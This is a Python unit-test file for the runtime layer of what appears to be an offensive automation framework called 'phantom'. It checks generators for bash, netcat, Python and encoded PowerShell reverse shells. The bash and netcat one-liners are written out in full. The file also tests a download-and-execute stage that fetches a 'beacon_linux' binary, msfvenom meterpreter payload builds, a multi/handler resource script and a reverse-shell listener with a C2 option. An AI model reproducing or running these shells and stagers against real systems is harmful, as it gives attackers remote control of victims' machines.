"""Tests for the runtime layer: payloads, reverse handlers, msf runner."""
import unittest

from phantom.automation.runtime.payloads import (
    python_reverse_shell,
    bash_reverse_shell,
    netcat_reverse_shell,
    powershell_reverse_shell,
    python_callback_probe,
    download_exec_stage,
)
from phantom.automation.runtime.reverse import CallbackListener, ReverseHandler, verify_reverse_callback
from phantom.automation.runtime.msf import msfvenom_command, MsfRunner
from phantom.automation.runtime.toolrunner import ToolMissingError


class TestPayloads(unittest.TestCase):

    def test_python_reverse_shell(self):
        cmd = python_reverse_shell("10.0.0.5", 4444)
        self.assertIn("10.0.0.5", cmd)
        self.assertIn("4444", cmd)
        self.assertIn("/bin/sh", cmd)

    def test_bash_reverse_shell(self):
        self.assertEqual(bash_reverse_shell("1.2.3.4", 9000),
                         "bash -i >& /dev/tcp/1.2.3.4/9000 0>&1")

    def test_netcat_reverse_shell(self):
        self.assertEqual(netcat_reverse_shell("1.2.3.4", 1234), "nc 1.2.3.4 1234 -e /bin/bash")

    def test_powershell_reverse_shell(self):
        import base64
        cmd = powershell_reverse_shell("10.0.0.5", 5555)
        self.assertIn("powershell", cmd)
        self.assertIn("-Enc", cmd)
        b64 = cmd.split("-Enc ")[1].strip()
        decoded = base64.b64decode(b64).decode("utf-16-le")
        self.assertIn("'10.0.0.5'", decoded)
        self.assertIn("5555", decoded)
        self.assertIn("TCPClient", decoded)

    def test_download_exec_stage(self):
        cmd = download_exec_stage("10.0.0.5", 8080, "beacon_linux")
        self.assertIn("http://10.0.0.5:8080/beacon_linux", cmd)
        self.assertIn("chmod +x", cmd)


class TestCallbackListener(unittest.TestCase):
    """Real socket round-trip — the listener must actually receive data."""

    def test_receives_probe(self):
        handler = ReverseHandler(host="127.0.0.1", register_in_c2=False)
        try:
            port = handler.start()
            probe = python_callback_probe("127.0.0.1", port, "PINGME")
            import subprocess, sys
            subprocess.run(probe, shell=True, timeout=20)
            self.assertTrue(handler.wait_marker("PINGME", timeout=10))
            self.assertIn("PINGME", handler.listener.read())
        finally:
            handler.stop()

    def test_listener_port_is_real(self):
        listener = CallbackListener(port=0)
        port = listener.start()
        self.assertGreater(port, 0)
        listener.stop()


class TestMsfRunner(unittest.TestCase):

    def test_msfvenom_command_build(self):
        cmd = msfvenom_command("linux/x64/meterpreter/reverse_tcp", "10.0.0.5", 4444)
        self.assertIn("LHOST=10.0.0.5", cmd)
        self.assertIn("LPORT=4444", cmd)
        self.assertIn("-f elf", cmd)

    def test_msfvenom_windows_format(self):
        cmd = msfvenom_command("windows/x64/meterpreter/reverse_tcp", "10.0.0.5", 4444,
                               platform="windows")
        self.assertIn("-f exe", cmd)
        self.assertIn("x64", cmd)

    def test_resource_script_content(self):
        runner = MsfRunner()
        try:
            rc = runner.resource_script("linux/x64/meterpreter/reverse_tcp", "10.0.0.5", 4444)
            with open(rc, encoding="utf-8") as f:
                content = f.read()
            self.assertIn("use exploit/multi/handler", content)
            self.assertIn("set LPORT 4444", content)
            self.assertIn("run -j", content)
        finally:
            runner.cleanup()

    def test_spawn_requires_msfconsole(self):
        runner = MsfRunner()
        with self.assertRaises(ToolMissingError):
            runner.spawn("nonexistent.rc")


if __name__ == "__main__":
    unittest.main()
